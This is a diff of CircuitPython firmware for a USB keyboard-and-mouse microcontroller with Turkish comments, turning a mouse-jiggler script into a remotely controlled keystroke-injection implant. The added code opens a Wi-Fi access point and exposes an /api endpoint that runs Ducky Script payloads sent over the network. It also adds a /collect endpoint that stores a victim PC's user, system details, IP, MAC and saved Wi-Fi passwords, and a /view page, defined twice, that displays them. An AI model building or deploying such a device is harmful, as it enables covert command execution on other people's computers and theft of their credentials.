@@ -10,22 +10,25 @@ from adafruit_hid.mouse import Mouse
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
 
-# duck.py'den tuşları al
+# Duck import
+try:
+    from duck import exe
+    duck_ok = True
+except:
+    duck_ok = False
+    print("Duck yok!")
+
+# Tuşlar
 try:
     from duck import duckyCommands
-    safe_keys = []
-    for key in duckyCommands.values():
-        if isinstance(key, int) and key >= Keycode.A and key <= Keycode.Z:
-            safe_keys.append(key)
-    # ENTER ve CAPSLOCK ekle
+    safe_keys = [v for v in duckyCommands.values() if isinstance(v, int) and Keycode.A <= v <= Keycode.Z]
     safe_keys.extend([Keycode.ENTER, Keycode.CAPS_LOCK])
-    print(f"✅ {len(safe_keys)} tuş yüklendi (ENTER, CAPSLOCK dahil)")
 except:
-    safe_keys = [Keycode.A, Keycode.B, Keycode.C, Keycode.ENTER, Keycode.CAPS_LOCK]
-    print("⚠️ Varsayılan tuşlar kullanılıyor")
+    safe_keys = [Keycode.A, Keycode.B, Keycode.ENTER, Keycode.CAPS_LOCK]
 
-ssid = "FATİHH"
-password = "12345678"
+# WiFi
+wifi.radio.start_ap("FATİHH", "12345678")
+print(f"IP: {wifi.radio.ipv4_address}")
 
 # Pinler
 gp5 = digitalio.DigitalInOut(board.GP5)
@@ -36,40 +39,31 @@ gp6.pull = digitalio.Pull.UP
 # HID
 mouse = Mouse(usb_hid.devices)
 kbd = Keyboard(usb_hid.devices)
-
 jiggler_running = False
+last_data = {}
 
 def mouse_jiggle():
     global jiggler_running
     jiggler_running = True
-    print("🖱️ Mouse jiggle başladı")
     while jiggler_running and not gp5.value:
         mouse.move(random.randint(-100, 100), random.randint(-100, 100))
         time.sleep(0.1)
         server.poll()
     jiggler_running = False
-    print("🖱️ Mouse jiggle bitti")
 
 def combined_jiggle():
     global jiggler_running
     jiggler_running = True
-    print("🖱️⌨️ Mouse + Klavye başladı")
     while jiggler_running and not gp6.value:
         if random.random() < 0.5:
             mouse.move(random.randint(-100, 100), random.randint(-100, 100))
         else:
-            key = random.choice(safe_keys)
-            kbd.press(key)
+            kbd.press(random.choice(safe_keys))
             time.sleep(0.05)
             kbd.release_all()
         time.sleep(0.1)
         server.poll()
     jiggler_running = False
-    print("🖱️⌨️ Mouse + Klavye bitti")
-
-# WiFi AP
-wifi.radio.start_ap(ssid, password)
-print(f"📡 WiFi: {ssid} | IP: {wifi.radio.ipv4_address}")
 
 # Server
 pool = socketpool.SocketPool(wifi.radio)
@@ -82,21 +76,26 @@ def base(request: Request):
 
 @server.route("/api", POST)
 def api(request: Request):
-    return JSONResponse(request, {"message": "OK"})
+    try:
+        data = request.json()
+        payload = data.get("content", "")
+        if duck_ok and payload:
+            exe(payload.splitlines())
+        return JSONResponse(request, {"status": "ok"})
+    except Exception as e:
+        print(f"API hatası: {e}")
+        return JSONResponse(request, {"status": "error"}, status=500)
 
 @server.route("/jiggle/mouse", POST)
 def api_mouse(request: Request):
     global jiggler_running
     if not jiggler_running:
         jiggler_running = True
-        print("🌐 Web: Mouse jiggle başladı")
         for _ in range(50):
-            if not jiggler_running:
-                break
+            if not jiggler_running: break
             mouse.move(random.randint(-100, 100), random.randint(-100, 100))
             time.sleep(0.1)
         jiggler_running = False
-        print("🌐 Web: Mouse jiggle bitti")
     return JSONResponse(request, {"status": "ok"})
 
 @server.route("/jiggle/combined", POST)
@@ -104,41 +103,116 @@ def api_combined(request: Request):
     global jiggler_running
     if not jiggler_running:
         jiggler_running = True
-        print("🌐 Web: Mouse + Klavye başladı")
         for _ in range(50):
-            if not jiggler_running:
-                break
+            if not jiggler_running: break
             if random.random() < 0.5:
                 mouse.move(random.randint(-100, 100), random.randint(-100, 100))
             else:
-                key = random.choice(safe_keys)
-                kbd.press(key)
+                kbd.press(random.choice(safe_keys))
                 time.sleep(0.05)
                 kbd.release_all()
             time.sleep(0.1)
         jiggler_running = False
-        print("🌐 Web: Mouse + Klavye bitti")
     return JSONResponse(request, {"status": "ok"})
 
 @server.route("/jiggle/stop", POST)
 def api_stop(request: Request):
     global jiggler_running
     jiggler_running = False
-    print("⏹️ Jiggler durduruldu")
     return JSONResponse(request, {"status": "stopped"})
 
+@server.route("/collect", POST)
+def collect(request: Request):
+    try:
+        data = request.json()
+        if data.get("type") == "all":
+            last_data["all"] = {
+                "wifi": data.get("wifi", []),
+                "pc": data.get("pc", "?"),
+                "user": data.get("user", "?"),
+                "os": data.get("os", "?"),
+                "cpu": data.get("cpu", "?")[:50],
+                "ram": data.get("ram", "?"),
+                "gpu": data.get("gpu", "?")[:50],
+                "ip": data.get("ip", "?"),
+                "mac": data.get("mac", "?"),
+                "uptime": data.get("uptime", "?"),
+                "tarih": data.get("tarih", "?")  # PC'den gelen tarih
+            }
+            print(f"✅ Veri alındı: {last_data['all']['tarih']}")
+        return JSONResponse(request, {"status": "ok"})
+    except:
+        return JSONResponse(request, {"status": "error"}, status=500)
+
+@server.route("/view")
+def view(request: Request):
+    html = """<html><head><meta charset='UTF-8'><style>
+        body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
+        h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
+        a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
+    </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
+    
+    if "all" in last_data:
+        d = last_data["all"]
+        html += f"<b>🕐 Toplanma Zamanı:</b> {d.get('tarih','?')}<br><br>"
+        html += f"<b>💻 PC:</b> {d.get('pc','?')}<br>"
+        html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
+        html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
+        html += f"<b>⚡ CPU:</b> {d.get('cpu','?')}<br>"
+        html += f"<b>🧠 RAM:</b> {d.get('ram','?')} GB<br>"
+        html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
+        html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
+        html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
+        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
+        html += "<b>🔑 WiFi:</b><br>"
+        for w in d.get("wifi", []):
+            html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
+    else:
+        html += "Veri yok."
+    
+    html += "</div><br><a href='/'>← Geri</a></body></html>"
+    return Response(request, html, headers={"Content-Type": "text/html"})
+
+@server.route("/view")
+def view(request: Request):
+    html = """<html><head><meta charset='UTF-8'><style>
+        body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
+        h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
+        a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
+    </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
+    
+    if "all" in last_data:
+        d = last_data["all"]
+        html += f"<b>🕐 Alınma Zamanı:</b> {d.get('tarih','?')} {d.get('saat','?')}<br><br>"
+        html += f"<b>💻 Bilgisayar:</b> {d.get('pc','?')}<br>"
+        html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
+        html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
+        html += f"<b>⚡ CPU:</b> {d.get('cpu','?')}<br>"
+        html += f"<b>🧠 RAM:</b> {d.get('ram','?')} GB<br>"
+        html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
+        html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
+        html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
+        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
+        html += "<b>🔑 WiFi Şifreleri:</b><br>"
+        for w in d.get("wifi", []):
+            html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
+    else:
+        html += "Henüz veri toplanmadı."
+    
+    html += "</div><br><a href='/'>← Geri</a></body></html>"
+    return Response(request, html, headers={"Content-Type": "text/html"})
 # Ana döngü
-print("🔍 Pin kontrolü başladı")
 server.start('192.168.4.1', 80)
+print("✅ Sistem hazır!")
+print("🔵 GP5->GND: Mouse")
+print("🟢 GP6->GND: Mouse+Klavye")
 
 while True:
     server.poll()
-
     if not gp5.value and not jiggler_running:
-        print("🔵 GP5 tetiklendi -> Mouse")
+        print("🔵 GP5 tetiklendi")
         mouse_jiggle()
     elif not gp6.value and not jiggler_running:
-        print("🟢 GP6 tetiklendi -> Mouse + Klavye")
+        print("🟢 GP6 tetiklendi")
         combined_jiggle()
-
     time.sleep(0.1)
